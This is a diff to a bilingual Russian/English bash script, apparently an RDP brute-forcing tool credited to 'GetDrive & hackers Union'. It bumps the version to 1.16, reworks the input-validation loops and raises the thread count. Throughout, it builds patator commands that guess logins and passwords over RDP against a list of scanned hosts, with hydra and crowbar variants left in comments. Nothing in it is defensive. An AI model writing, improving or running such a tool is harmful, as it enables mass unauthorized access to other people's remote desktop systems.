@@ -86,6 +86,7 @@ fi
 
 }
 ######################################################################################
+#######################################COUNTRYLIST####################################
 COUNTRYLIST ()
 {
 echo -e "$grey 1.$yellow   Afghanistan";
@@ -313,7 +314,7 @@ clear
 echo -e       "$grey                     +-------------------------------------+"
 echo -e       "$grey                     |            Auto  Script             |"
 echo -e "$aquamarine                     |    by GetDrive & hackers Union      |" 
-echo -e        "$red                     |            Version 1.15             |"
+echo -e        "$red                     |            Version 1.16             |"
 echo -e        "$red                     +-------------------------------------+ $colorbase"
 #####################################CHECKLANGUAGE####################################
 CHECKLANGUAGE ()
@@ -435,9 +436,7 @@ clear
 echo -e "$red-------------------------------------------------------------------------------$colorbase"    
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -508,9 +507,7 @@ clear
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -29344,18 +29341,20 @@ read -p "                               Выбор из меню : " brutmenu
 
 if [ "$brutmenu" = "1" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
-read -p "*Введите логин {administrator, admin & etc.} : " $loginbrute
+BRUTMENU1 (){
+read -p "*Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "*Укажите путь к файлу со списком паролей {dict/john}: " passlist
-if [ -s $passlist ]; then
-echo ""
+}
+while BRUTMENU1
+do
+if [[ -z $loginbrute || ! -s $passlist ]]; then
+echo -e "\n$red***ОШИБКА! Неверно указан логин или файл с паролями$green"
 else
-echo -e "\n$red***ОШИБКА! Неверно указан логин или файл с паролями"
-echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
-read -p ""
-./rdp_brute.sh
-exit;
-./rdp_brute.sh
+break
+echo ""
 fi
+done
+
 
 clear
 echo -e "                               $green Запуск брутфорса"
@@ -29376,18 +29375,19 @@ fi
 
 if [ "$brutmenu" = "2" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
+BRUTMENU2 (){
 read -p "*Укажите путь к файлу со списком логинов {dict/users}: " loginlist
-read -p "*Введите пароль {administrator, admin, 123456 & etc.} : " $passbrute
-if [ -s $passbrute ]; then
-echo ""
+read -p "*Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
+}
+while BRUTMENU2
+do
+if [[ -z $passbrute || ! -s $loginlist ]]; then
+echo -e "\n$red***ОШИБКА! Неверно указан пароль или файл с логинами$green"
 else
-echo -e "\n$red***ОШИБКА! Неверно указан пароль или файл с логинами"
-echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
-read -p ""
-./rdp_brute.sh
-exit;
-./rdp_brute.sh
-fi
+break
+echo ""
+fi 
+done
 
 clear
 echo -e "                               $green Запуск брутфорса"
@@ -29407,18 +29407,19 @@ fi
 
 if [ "$brutmenu" = "3" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
+BRUTEMENU3 () {
 read -p "*Укажите путь к файлу со списком логинов {dict/users}: " loginlist
 read -p "*Укажите путь к файлу со списком паролей {dict/john}: " passlist
-if [ -s $passlist -a -s $loginlist ]; then
-echo ""
+}
+while BRUTEMENU3
+do
+if [[ ! -s $passlist || ! -s $loginlist ]]; then
+echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или с паролями$green"
 else
-echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или с паролями"
-echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
-read -p ""
-./rdp_brute.sh
-exit;
-./rdp_brute.sh
+break
+echo ""
 fi
+done
 
 clear
 echo -e "                               $green Запуск брутфорса"
@@ -29483,25 +29484,26 @@ read -p "                               Сhoose from a menu : " brutmenu
 
 if [ "$brutmenu" = "1" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
+BRUTMENUEN1 () {
 read -p "*Enter username {administrator, admin & etc.} : " loginbrute
 read -p "*Enter the path to the file with a list of passwords {dict/john}: " passlist
-if [ -s $passlist ]; then
-echo ""
+}
+while BRUTMENUEN1
+do
+if [[ -z $loginbrute || ! -s $passlist ]]; then
+echo -e "\n$red***ERROR! Incorrect login or password file$green"
 else
-
-echo -e "\n$red***ERROR! Incorrect login or password file"
-echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
-read -p ""
-./rdp_brute.sh
-exit;
-./rdp_brute.sh
+break
+echo ""
 fi
+done
+
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=>$green "
 echo ""
-python patator.py rdp_login host=FILE0 port=$port user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
+python patator.py rdp_login host=FILE0 port=$port user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -29515,26 +29517,27 @@ fi
 
 if [ "$brutmenu" = "2" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
+BRUTEMENUEN2 () {
 read -p "*Enter the path to username dictionary {dict/users}: " loginlist
 read -p "*Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-if [ -s $loginlist ];
+}
+while BRUTEMENUEN2
+do
+if [[ ! -s $loginlist || -z $passbrute ]];
 then
-echo ""
+echo -e "\n$red***ERROR! Incorrect file with login and password unknown$green"
 else
-echo -e "\n$red***ERROR! Incorrect file with login and password unknown"
-echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
-read -p ""
-./rdp_brute.sh
-exit;
-./rdp_brute.sh
+break
+echo ""
 fi
+done
 
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
 echo ""
-python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=$passbrute 0=open3389 1=users -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
+python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=$passbrute 0=open3389 1=users -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -29548,25 +29551,26 @@ fi
 
 if [ "$brutmenu" = "3" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
+BRUTEMENU3 () {
 read -p "*Enter the path to username dictionary {dict/users}: " loginlist
 read -p "*Enter the path to passwords dictionary {dict/john}: " passlist
-if [ -s $loginlist -a -s $passlist ]; then
-echo ""
+}
+while BRUTEMENU3
+do
+if [[ ! -s $loginlist || ! -s $passlist ]]; then
+echo -e "\n$red***ERROR! Incorrect file with logins and passwords file$green"
 else
-echo -e "\n$red***ERROR! Incorrect file with logins and passwords file"
-echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
-read -p ""
-./rdp_brute.sh
-exit;
-./rdp_brute.sh
+break
+echo ""
 fi
+done
 
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
 echo ""
-python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
+python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -29713,5 +29717,4 @@ fi
 }
 #####################################################################################
 CHECKLANGUAGE
-#######################################COUNTRYLIST####################################
 
